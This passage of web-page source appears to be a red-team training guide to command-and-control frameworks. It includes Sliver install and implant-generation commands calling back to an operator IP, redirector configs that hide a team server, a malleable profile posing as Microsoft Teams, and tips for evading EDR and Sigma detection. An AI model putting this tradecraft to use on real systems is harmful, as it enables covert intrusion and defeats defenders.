              Framework Comparison Matrix
            </Typography>
            <TableContainer>
              <Table size="small">
                <TableHead>
                  <TableRow>
                    <TableCell sx={{ fontWeight: 700 }}>Framework</TableCell>
                    <TableCell sx={{ fontWeight: 700 }}>Type</TableCell>
                    <TableCell sx={{ fontWeight: 700 }}>Learning Curve</TableCell>
                    <TableCell sx={{ fontWeight: 700 }}>Best For</TableCell>
                    <TableCell sx={{ fontWeight: 700 }}>EDR Evasion</TableCell>
                  </TableRow>
                </TableHead>
                <TableBody>
                  {[
                    { name: "Cobalt Strike", type: "Commercial", curve: "Medium", best: "Enterprise red teams", evasion: "★★★★☆" },
                    { name: "Brute Ratel", type: "Commercial", curve: "Medium", best: "EDR-heavy environments", evasion: "★★★★★" },
                    { name: "Nighthawk", type: "Commercial", curve: "Hard", best: "Advanced adversary sim", evasion: "★★★★★" },
                    { name: "Sliver", type: "Open Source", curve: "Easy", best: "Cross-platform, learning", evasion: "★★★★☆" },
                    { name: "Havoc", type: "Open Source", curve: "Medium", best: "Windows-focused ops", evasion: "★★★★☆" },
                    { name: "Mythic", type: "Open Source", curve: "Medium", best: "Multi-platform teams", evasion: "★★★★☆" },
                    { name: "PoshC2", type: "Open Source", curve: "Easy", best: "PowerShell-heavy envs", evasion: "★★★☆☆" },
                    { name: "Covenant", type: "Open Source", curve: "Easy", best: ".NET environments", evasion: "★★★☆☆" },
                    { name: "Metasploit", type: "Open Source", curve: "Easy", best: "Learning/CTFs", evasion: "★★☆☆☆" },
                  ].map((row, i) => (
                    <TableRow key={i}>
                      <TableCell sx={{ fontWeight: 600 }}>{row.name}</TableCell>
                      <TableCell>
                        <Chip 
                          label={row.type} 
                          size="small" 
                          color={row.type === "Commercial" ? "warning" : "success"} 
                          variant="outlined"
                        />
                      </TableCell>
                      <TableCell>{row.curve}</TableCell>
                      <TableCell>{row.best}</TableCell>
                      <TableCell>{row.evasion}</TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </TableContainer>
          </Paper>

          {/* Quick Start Guide */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Quick Start: Setting Up Sliver (Recommended for Beginners)
            </Typography>
            <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
              Sliver is the recommended starting point for learning C2 operations. Here's a complete setup guide:
            </Typography>
            <Stepper orientation="vertical">
              <Step active>
                <StepLabel><Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Install Sliver Server</Typography></StepLabel>
                <StepContent>
                  <CodeBlock language="bash">{`# Linux/macOS - One-liner installation
curl https://sliver.sh/install | sudo bash

# Or manual download from GitHub releases
# https://github.com/BishopFox/sliver/releases

# Start the server (first run generates certificates)
sliver-server`}</CodeBlock>
                </StepContent>
              </Step>
              <Step active>
                <StepLabel><Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Generate an Implant</Typography></StepLabel>
                <StepContent>
                  <CodeBlock language="bash">{`# Generate Windows implant with MTLS
generate --mtls YOUR_IP:443 --os windows --arch amd64 --save implant.exe

# Generate Linux implant with HTTP
generate --http YOUR_IP:80 --os linux --arch amd64 --save implant

# Generate macOS implant
generate --mtls YOUR_IP:443 --os darwin --arch amd64 --save implant.app`}</CodeBlock>
                </StepContent>
              </Step>
              <Step active>
                <StepLabel><Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Start a Listener</Typography></StepLabel>
                <StepContent>
                  <CodeBlock language="bash">{`# Start MTLS listener on port 443
mtls --lhost 0.0.0.0 --lport 443

# Or HTTP listener
http --lhost 0.0.0.0 --lport 80 --domain cdn.example.com

# View active listeners
jobs`}</CodeBlock>
                </StepContent>
              </Step>
              <Step active>
                <StepLabel><Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Interact with Sessions</Typography></StepLabel>
                <StepContent>
                  <CodeBlock language="bash">{`# List sessions
sessions

# Use a session (tab complete works)
use [session-id]

# Basic commands
info        # System info
whoami      # Current user
pwd         # Current directory
ps          # Process list
netstat     # Network connections
shell       # Interactive shell`}</CodeBlock>
                </StepContent>
              </Step>
            </Stepper>
          </Paper>
        </Box>
      )}

      {/* Tab 2: Protocols */}
      {activeTab === 2 && (
        <Box sx={{ display: "flex", flexDirection: "column", gap: 3 }}>
          <Alert severity="info" sx={{ borderRadius: 2 }}>
            <AlertTitle>C2 Communication Protocols</AlertTitle>
            Different protocols offer trade-offs between stealth, speed, and reliability.
            Choose based on target environment and detection capabilities. Most operations use HTTPS
            for initial callback, with DNS as a fallback channel.
          </Alert>

          {/* Protocol Quick Reference */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Protocol Selection Guide</Typography>
            <Grid container spacing={2}>
              {[
                { proto: "HTTPS", when: "Default choice - blends with normal traffic", icon: <HttpIcon sx={{ color: "#3b82f6" }} /> },
                { proto: "DNS", when: "Highly restricted networks, fallback channel", icon: <DnsIcon sx={{ color: "#10b981" }} /> },
                { proto: "SMB", when: "Internal movement without egress", icon: <RouterIcon sx={{ color: "#8b5cf6" }} /> },
                { proto: "ICMP", when: "When all else fails, firewall bypass", icon: <NetworkCheckIcon sx={{ color: "#f59e0b" }} /> },
              ].map((item, i) => (
                <Grid item xs={12} sm={6} key={i}>
                  <Box sx={{ display: "flex", gap: 2, alignItems: "center", p: 2, bgcolor: alpha(theme.palette.primary.main, 0.03), borderRadius: 1 }}>
                    {item.icon}
                    <Box>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{item.proto}</Typography>
                      <Typography variant="caption" color="text.secondary">{item.when}</Typography>
                    </Box>
                  </Box>
                </Grid>
              ))}
            </Grid>
          </Paper>

          {c2Protocols.map((proto, idx) => (
            <Accordion key={idx} defaultExpanded={idx === 0}>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2, width: "100%" }}>
                  <Box sx={{ color: "primary.main" }}>{proto.icon}</Box>
                  <Box sx={{ flex: 1 }}>
                    <Typography variant="h6" sx={{ fontWeight: 700 }}>{proto.protocol}</Typography>
                    <Typography variant="body2" color="text.secondary">{proto.description}</Typography>
                  </Box>
                </Box>
              </AccordionSummary>
              <AccordionDetails>
                {/* Extended description */}
                {proto.longDescription && (
                  <Alert severity="info" icon={<LightbulbIcon />} sx={{ mb: 2 }}>
                    <Typography variant="body2">{proto.longDescription}</Typography>
                  </Alert>
                )}

                <Grid container spacing={2}>
                  <Grid item xs={12} md={4}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "success.main", mb: 1 }}>Advantages</Typography>
                    <List dense>
                      {proto.pros.map((p, i) => (
                        <ListItem key={i} sx={{ py: 0.25 }}>
                          <ListItemIcon sx={{ minWidth: 20 }}>
                            <CheckCircleIcon sx={{ fontSize: 12, color: "success.main" }} />
                          </ListItemIcon>
                          <ListItemText primary={p} primaryTypographyProps={{ variant: "body2" }} />
                        </ListItem>
                      ))}
                    </List>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "error.main", mb: 1 }}>Disadvantages</Typography>
                    <List dense>
                      {proto.cons.map((c, i) => (
                        <ListItem key={i} sx={{ py: 0.25 }}>
                          <ListItemIcon sx={{ minWidth: 20 }}>
                            <WarningAmberIcon sx={{ fontSize: 12, color: "error.main" }} />
                          </ListItemIcon>
                          <ListItemText primary={c} primaryTypographyProps={{ variant: "body2" }} />
                        </ListItem>
                      ))}
                    </List>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "warning.main", mb: 1 }}>Detection Vectors</Typography>
                    <Typography variant="body2">{proto.detection}</Typography>
                  </Grid>

                  {/* Code Example */}
                  {proto.example && (
                    <Grid item xs={12}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Example Configuration</Typography>
                      <CodeBlock language="bash">{proto.example}</CodeBlock>
                    </Grid>
                  )}
                </Grid>
              </AccordionDetails>
            </Accordion>
          ))}

          {/* Traffic Pattern Examples */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Traffic Pattern Analysis</Typography>
            <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
              Understanding what C2 traffic looks like helps both offense (blending in) and defense (detection).
            </Typography>
            <Grid container spacing={2}>
              {trafficExamples.map((traffic, idx) => (
                <Grid item xs={12} md={6} key={idx}>
                  <Card sx={{ p: 2, height: "100%" }}>
                    <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                      <NetworkCheckIcon sx={{ color: "primary.main" }} />
                      <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>{traffic.name}</Typography>
                    </Box>
                    <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>{traffic.description}</Typography>
                    <Typography variant="caption" sx={{ fontWeight: 600, color: "error.main" }}>Detection Indicators:</Typography>
                    <List dense>
                      {traffic.indicators.map((ind, i) => (
                        <ListItem key={i} sx={{ py: 0 }}>
                          <ListItemText primary={`• ${ind}`} primaryTypographyProps={{ variant: "caption" }} />
                        </ListItem>
                      ))}
                    </List>
                  </Card>
                </Grid>
              ))}
            </Grid>
          </Paper>
        </Box>
      )}

      {/* Tab 3: Infrastructure */}
      {activeTab === 3 && (
        <Box sx={{ display: "flex", flexDirection: "column", gap: 3 }}>
          <Alert severity="info" sx={{ borderRadius: 2 }}>
            <AlertTitle>C2 Infrastructure Design</AlertTitle>
            Proper infrastructure setup is critical for operational security and mission success. A well-designed 
            C2 infrastructure protects your team server, provides redundancy, and helps blend into normal traffic.
          </Alert>

          {/* Infrastructure Overview */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Layered Infrastructure Model
            </Typography>
            <Typography variant="body2" color="text.secondary" sx={{ mb: 3 }}>
              Professional C2 infrastructure uses multiple layers of separation. If one layer is compromised or 
              detected, you can burn it without losing your entire operation.
            </Typography>
            <CodeBlock>{`┌─────────────────────────────────────────────────────────────────────────────┐
│                              INTERNET                                        │
└───────────────────────────────────┬──────────────────────────────────────────┘
                                    │
        ┌───────────────────────────┼───────────────────────────┐
        │                           │                           │
        ▼                           ▼                           ▼
┌───────────────┐           ┌───────────────┐           ┌───────────────┐
│  Redirector   │           │  Redirector   │           │   Payload     │
│   (HTTPS)     │           │    (DNS)      │           │   Staging     │
│  cdn.target.  │           │  ns1.domain.  │           │  files.xyz.   │
│    com        │           │    com        │           │    com        │
└───────┬───────┘           └───────┬───────┘           └───────────────┘
        │                           │                         │
        │     Legitimate-looking    │                         │
        │        traffic only       │                         │
        │                           │                         │
        └───────────────┬───────────┘                         │
                        │                                     │
                        ▼                                     │
                ┌───────────────┐                             │
                │   Internal    │                             │
                │    VPN/       │  <───── Operator Access     │
                │  Jump Host    │                             │
                └───────┬───────┘                             │
                        │                                     │
                        ▼                                     │
                ┌───────────────┐                             │
                │  TEAM SERVER  │◄─────────────────────────────
                │   (Never      │
                │  exposed!)    │
                └───────────────┘

BURN ORDER: If compromised, burn from outside in.
  1. First: Payload Staging (short-lived anyway)
  2. Then: Redirectors (easily replaceable)
  3. Last Resort: Team Server (should never happen)`}</CodeBlock>
          </Paper>

          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Infrastructure Components
            </Typography>
            <Grid container spacing={2}>
              {infrastructureComponents.map((comp, idx) => (
                <Grid item xs={12} md={6} key={idx}>
                  <Card sx={{ p: 2, height: "100%", border: `1px solid ${alpha(theme.palette.primary.main, 0.1)}` }}>
                    <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                      {comp.icon}
                      <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>{comp.component}</Typography>
                    </Box>
                    <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>{comp.description}</Typography>
                    
                    {/* Extended description */}
                    {comp.longDescription && (
                      <Typography variant="body2" sx={{ mb: 2, p: 1, bgcolor: alpha(theme.palette.info.main, 0.05), borderRadius: 1 }}>
                        {comp.longDescription}
                      </Typography>
                    )}

                    <Typography variant="caption" sx={{ fontWeight: 600 }}>Key Considerations:</Typography>
                    <List dense>
                      {comp.considerations.map((c, i) => (
                        <ListItem key={i} sx={{ py: 0 }}>
                          <ListItemText primary={`• ${c}`} primaryTypographyProps={{ variant: "caption" }} />
                        </ListItem>
                      ))}
                    </List>

                    {/* Best Practices */}
                    {comp.bestPractices && comp.bestPractices.length > 0 && (
                      <>
                        <Typography variant="caption" sx={{ fontWeight: 600, color: "success.main" }}>Best Practices:</Typography>
                        <List dense>
                          {comp.bestPractices.map((bp, i) => (
                            <ListItem key={i} sx={{ py: 0 }}>
                              <ListItemIcon sx={{ minWidth: 16 }}>
                                <CheckCircleIcon sx={{ fontSize: 10, color: "success.main" }} />
                              </ListItemIcon>
                              <ListItemText primary={bp} primaryTypographyProps={{ variant: "caption" }} />
                            </ListItem>
                          ))}
                        </List>
                      </>
                    )}
                  </Card>
                </Grid>
              ))}
            </Grid>
          </Paper>

          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Redirector Configuration Examples
            </Typography>
            
            <Accordion defaultExpanded>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Apache mod_rewrite (HTTPS)</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
                  Apache-based redirectors use mod_rewrite to filter traffic and only forward legitimate C2 callbacks.
                </Typography>
                <CodeBlock language="apache">{`# /etc/apache2/sites-available/redirector.conf
<VirtualHost *:443>
    ServerName cdn.example.com
    
    SSLEngine On
    SSLCertificateFile /etc/ssl/certs/cert.pem
    SSLCertificateKeyFile /etc/ssl/private/key.pem
    
    RewriteEngine On
    
    # Logging for debugging (disable in production)
    RewriteLog "/var/log/apache2/rewrite.log"
    RewriteLogLevel 3
    
    # Condition 1: Must have correct URI pattern
    RewriteCond %{REQUEST_URI} ^/api/v1/status$ [OR]
    RewriteCond %{REQUEST_URI} ^/api/v1/update$
    
    # Condition 2: Must have correct User-Agent
    RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0.*Chrome.*Safari"
    
    # Condition 3: Must be POST or GET
    RewriteCond %{REQUEST_METHOD} ^(GET|POST)$
    
    # If all conditions match, proxy to team server
    RewriteRule ^(.*)$ https://team-server.internal:443$1 [P,L]
    
    # IMPORTANT: Everything else goes to legitimate site
    # This makes the redirector look like a real CDN
    RewriteRule ^(.*)$ https://real-cdn-site.com [R=302,L]
</VirtualHost>`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Nginx Reverse Proxy</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock language="nginx">{`# /etc/nginx/sites-available/redirector
server {
    listen 443 ssl http2;
    server_name cdn.example.com;
    
    ssl_certificate /etc/ssl/certs/cert.pem;
    ssl_certificate_key /etc/ssl/private/key.pem;
    
    # Default: redirect to legitimate site
    location / {
        return 302 https://legitimate-site.com;
    }
    
    # C2 traffic patterns
    location ~ ^/api/v1/(status|update|config) {
        # Validate User-Agent
        if ($http_user_agent !~* "Mozilla.*Chrome.*Safari") {
            return 302 https://legitimate-site.com;
        }
        
        # Proxy to team server
        proxy_pass https://team-server.internal:443;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>Cloudflare Workers (Serverless)</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
                  Using Cloudflare Workers as redirectors provides domain fronting-like capabilities.
                </Typography>
                <CodeBlock language="javascript">{`// Cloudflare Worker - deploy via wrangler
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  const userAgent = request.headers.get('User-Agent') || ''
  
  // Validate request matches our C2 pattern
  const validPaths = ['/api/v1/status', '/api/v1/update']
  const validUA = userAgent.includes('Chrome') && userAgent.includes('Safari')
  
  if (validPaths.includes(url.pathname) && validUA) {
    // Forward to real team server (use a worker-specific endpoint)
    const teamServer = 'https://team-server.internal:443'
    const newUrl = teamServer + url.pathname + url.search
    
    return fetch(newUrl, {
      method: request.method,
      headers: request.headers,
      body: request.body
    })
  }
  
  // Invalid requests get redirected to legitimate site
  return Response.redirect('https://legitimate-site.com', 302)
}`}</CodeBlock>
              </AccordionDetails>
            </Accordion>
          </Paper>
        </Box>
      )}

      {/* Tab 4: OPSEC */}
      {activeTab === 4 && (
        <Box sx={{ display: "flex", flexDirection: "column", gap: 3 }}>
          <Alert severity="warning" sx={{ borderRadius: 2 }}>
            <AlertTitle>Operational Security is Critical</AlertTitle>
            Poor OPSEC can burn operations, compromise infrastructure, alert defenders, and in worst cases,
            end careers. Every decision has OPSEC implications - always think like the defender.
          </Alert>

          {/* OPSEC Checklist */}
          <Paper sx={{ p: 3, borderRadius: 2, bgcolor: alpha("#f59e0b", 0.02) }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Pre-Operation OPSEC Checklist
            </Typography>
            <Grid container spacing={2}>
              {[
                { item: "Custom malleable profile tested", critical: true },
                { item: "Redirectors deployed and tested", critical: true },
                { item: "Domain categorization verified", critical: true },
                { item: "Infrastructure not linked to personal/company accounts", critical: true },
                { item: "VPN/anonymization for operator traffic", critical: true },
                { item: "Sleep time and jitter configured appropriately", critical: false },
                { item: "Payload tested against target's known AV/EDR", critical: false },
                { item: "Fallback C2 channels configured", critical: false },
                { item: "Kill dates set on implants", critical: false },
                { item: "Team communication channels secure", critical: false },
              ].map((check, i) => (
                <Grid item xs={12} sm={6} key={i}>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                    <Chip 
                      label={check.critical ? "CRITICAL" : "Important"} 
                      size="small" 
                      color={check.critical ? "error" : "warning"} 
                      variant="outlined"
                      sx={{ minWidth: 70 }}
                    />
                    <Typography variant="body2">{check.item}</Typography>
                  </Box>
                </Grid>
              ))}
            </Grid>
          </Paper>

          {opsecConsiderations.map((cat, idx) => (
            <Paper key={idx} sx={{ p: 3, borderRadius: 2 }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 1 }}>{cat.category}</Typography>
              {cat.description && (
                <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>{cat.description}</Typography>
              )}
              <Grid container spacing={2}>
                {cat.items.map((item, i) => (
                  <Grid item xs={12} md={6} key={i}>
                    <Box sx={{ p: 2, bgcolor: alpha(theme.palette.warning.main, 0.03), borderRadius: 1 }}>
                      <Box sx={{ display: "flex", alignItems: "flex-start", gap: 1 }}>
                        <VisibilityOffIcon sx={{ color: "warning.main", fontSize: 18, mt: 0.25 }} />
                        <Box>
                          <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>
                            {typeof item === "object" ? item.tip : item}
                          </Typography>
                          {typeof item === "object" && item.detail && (
                            <Typography variant="body2" color="text.secondary" sx={{ mt: 0.5 }}>
                              {item.detail}
                            </Typography>
                          )}
                        </Box>
                      </Box>
                    </Box>
                  </Grid>
                ))}
              </Grid>
            </Paper>
          ))}

          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Common OPSEC Failures & Lessons Learned
            </Typography>
            <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
              These are real mistakes that have burned operations. Learn from others' failures.
            </Typography>
            <Grid container spacing={2}>
              {[
                { mistake: "Default malleable profiles", impact: "Signature detection", lesson: "Always customize profiles for each engagement" },
                { mistake: "Predictable beaconing intervals", impact: "Traffic pattern analysis", lesson: "Use high jitter (30-50%) and variable sleep times" },
                { mistake: "Team server directly exposed", impact: "Infrastructure attribution", lesson: "Always use redirectors; team server should never touch internet" },
                { mistake: "Reusing domains across operations", impact: "Cross-operation correlation", lesson: "Fresh infrastructure for each engagement" },
                { mistake: "Running tools from disk", impact: "AV/EDR detection, forensic artifacts", lesson: "In-memory execution only; minimize disk touches" },
                { mistake: "Timestomping forgetting $MFT", impact: "Forensic timeline detection", lesson: "$MFT entries preserve original timestamps" },
                { mistake: "Using same C2 profile for all targets", impact: "Network detection rules trigger", lesson: "Customize traffic patterns per target environment" },
                { mistake: "Not cleaning up after operation", impact: "Persistence of implants, attribution", lesson: "Always have kill dates and cleanup procedures" },
              ].map((item, idx) => (
                <Grid item xs={12} md={6} key={idx}>
                  <Card sx={{ p: 2, height: "100%", border: `1px solid ${alpha("#dc2626", 0.2)}` }}>
                    <Box sx={{ display: "flex", gap: 1, alignItems: "center", mb: 1 }}>
                      <WarningAmberIcon sx={{ color: "error.main", fontSize: 18 }} />
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "error.main" }}>{item.mistake}</Typography>
                    </Box>
                    <Typography variant="caption" color="text.secondary" sx={{ display: "block", mb: 1 }}>
                      Impact: {item.impact}
                    </Typography>
                    <Typography variant="body2" sx={{ display: "flex", gap: 0.5, alignItems: "flex-start" }}>
                      <CheckCircleIcon sx={{ fontSize: 14, color: "success.main", mt: 0.25 }} />
                      {item.lesson}
                    </Typography>
                  </Card>
                </Grid>
              ))}
            </Grid>
          </Paper>

          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Malleable C2 Profile OPSEC
            </Typography>
            <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
              Malleable profiles define how your C2 traffic looks on the wire. Good profiles blend in; bad profiles get you caught.
            </Typography>
            <CodeBlock language="text">{`# Example: Making traffic look like Microsoft Teams API calls
# Cobalt Strike Malleable C2 Profile

set sample_name "Microsoft Teams";
set host_stage "false";
set jitter "37";
set sleeptime "45000";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

https-certificate {
    set CN       "teams.microsoft.com";
    set O        "Microsoft Corporation";
    set C        "US";
    set validity "365";
}

http-get {
    set uri "/api/chats/threads";
    
    client {
        header "Accept" "application/json";
        header "Authorization" "Bearer eyJ0eXAi..."; # Looks like real JWT
        
        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }
    
    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "X-MS-Response-Type" "json";
        
        output {
            base64;
            prepend '{"@odata.context":"https://graph.microsoft.com/v1.0/$metadata#chats","value":[';
            append ']}';
            print;
        }
    }
}

# OPSEC Tips:
# - Match User-Agent to target's browser population
# - Use legitimate-looking URIs for the application you're mimicking  
# - Include expected headers for the service
# - Response should parse as valid JSON if inspected`}</CodeBlock>
          </Paper>
        </Box>
      )}

      {/* Tab 5: Detection */}
      {activeTab === 5 && (
        <Box sx={{ display: "flex", flexDirection: "column", gap: 3 }}>
          <Alert severity="info" sx={{ borderRadius: 2 }}>
            <AlertTitle>Knowing Detection Helps Evasion</AlertTitle>
            Understanding how C2 is detected helps red teams improve their tradecraft. This section covers both
            perspectives - how defenders detect C2, and how to avoid those detections.
          </Alert>

          {/* Detection Overview */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Detection Categories Overview
            </Typography>
            <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
              C2 detection happens at multiple layers. Understanding each helps you evade them.
            </Typography>
            <Grid container spacing={2}>
              {[
                { layer: "Network", examples: "Proxy logs, DNS queries, Zeek/Suricata", icon: <NetworkCheckIcon sx={{ color: "#3b82f6" }} /> },
                { layer: "Endpoint", examples: "EDR, process monitoring, memory scanning", icon: <ComputerIcon sx={{ color: "#10b981" }} /> },
                { layer: "Behavioral", examples: "UEBA, ML anomaly detection, ATT&CK mapping", icon: <PsychologyIcon sx={{ color: "#8b5cf6" }} /> },
                { layer: "Threat Intel", examples: "IOC feeds, YARA rules, known signatures", icon: <FingerprintIcon sx={{ color: "#f59e0b" }} /> },
              ].map((item, i) => (
                <Grid item xs={12} sm={6} md={3} key={i}>
                  <Box sx={{ p: 2, bgcolor: alpha(theme.palette.primary.main, 0.03), borderRadius: 1, textAlign: "center" }}>
                    {item.icon}
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mt: 1 }}>{item.layer}</Typography>
                    <Typography variant="caption" color="text.secondary">{item.examples}</Typography>
                  </Box>
                </Grid>
              ))}
            </Grid>
          </Paper>

          {detectionMethods.map((method, idx) => (
            <Accordion key={idx} defaultExpanded={idx === 0}>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                  <ShieldIcon sx={{ color: "info.main" }} />
                  <Typography variant="h6" sx={{ fontWeight: 700 }}>{method.method}</Typography>
                </Box>
              </AccordionSummary>
              <AccordionDetails>
                <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>{method.description}</Typography>
                
                <Grid container spacing={2}>
                  <Grid item xs={12} md={6}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Detection Techniques</Typography>
                    <List dense>
                      {method.techniques.map((t, i) => (
                        <ListItem key={i} sx={{ py: 0.5, alignItems: "flex-start" }}>
                          <ListItemIcon sx={{ minWidth: 24, mt: 0.5 }}>
                            <ShieldIcon sx={{ fontSize: 14, color: "info.main" }} />
                          </ListItemIcon>
                          <ListItemText 
                            primary={typeof t === "object" ? t.name : t}
                            secondary={typeof t === "object" ? t.detail : undefined}
                            primaryTypographyProps={{ variant: "body2", fontWeight: 600 }}
                            secondaryTypographyProps={{ variant: "caption" }}
                          />
                        </ListItem>
                      ))}
                    </List>
                  </Grid>
                  <Grid item xs={12} md={6}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Common Tools</Typography>
                    <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5, mb: 2 }}>
                      {method.tools.map((tool, i) => (
                        <Chip key={i} label={tool} size="small" variant="outlined" />
                      ))}
                    </Box>
                  </Grid>

                  {/* Sigma Example */}
                  {method.sigmaExample && (
                    <Grid item xs={12}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Example Sigma Rule</Typography>
                      <CodeBlock language="yaml">{method.sigmaExample}</CodeBlock>
                    </Grid>
                  )}
                </Grid>
              </AccordionDetails>
            </Accordion>
          ))}

          {/* Evasion Tips */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Evasion Strategies by Detection Type
            </Typography>
            <Grid container spacing={2}>
              {[
                { 
                  detection: "Signature-based", 
                  evasion: "Unique payloads, obfuscation, custom profiles",
                  detail: "Modify every known signature element. Never use defaults."
                },
                { 
                  detection: "Behavioral analysis", 
                  evasion: "Mimic legitimate apps, blend with normal traffic",
                  detail: "Study target environment's normal traffic patterns first."
                },
                { 
                  detection: "Network anomaly", 
                  evasion: "High jitter, business hours only, proper TLS",
                  detail: "Your traffic should look statistically similar to real users."
                },
                { 
                  detection: "Memory scanning", 
                  evasion: "Encrypted sleep, syscall unhooking, module stomping",
                  detail: "Modern EDRs scan memory - encrypt or hide when not executing."
                },
                { 
                  detection: "DNS monitoring", 
                  evasion: "Legitimate resolvers, proper TTLs, avoid TXT records",
                  detail: "DNS C2 is noisy - use only as fallback, not primary channel."
                },
                { 
                  detection: "Threat intel IOCs", 
                  evasion: "Fresh infrastructure, unique domains, no reuse",
                  detail: "Assume all IOCs are shared within hours of discovery."
                },
              ].map((item, idx) => (
                <Grid item xs={12} md={6} key={idx}>
                  <Card sx={{ p: 2, height: "100%" }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "error.main" }}>
                      Detection: {item.detection}
                    </Typography>
                    <Typography variant="body2" sx={{ fontWeight: 600, color: "success.main", mt: 1 }}>
                      Evasion: {item.evasion}
                    </Typography>
                    <Typography variant="caption" color="text.secondary" sx={{ display: "block", mt: 0.5 }}>
                      {item.detail}
                    </Typography>
                  </Card>
                </Grid>
              ))}
            </Grid>
          </Paper>

          {/* Additional Sigma Rules */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              More Detection Sigma Rules
            </Typography>
            <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
              Understanding these rules helps you avoid triggering them.
            </Typography>
            
            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>C2 Beaconing Pattern</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock language="yaml">{`title: Potential C2 Beaconing Activity
status: experimental
logsource:
    category: proxy
detection:
    selection:
        c-uri|re: '.*\\.(php|aspx|jsp)\\?[a-z]{1,3}=[A-Za-z0-9+/=]{20,}'
    timeframe: 1h
    condition: selection | count() by c-ip > 50
level: medium
tags:
    - attack.command_and_control
    - attack.t1071.001
    
# Evasion: Use legitimate-looking URIs, vary request patterns,
# avoid predictable base64 in parameters`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
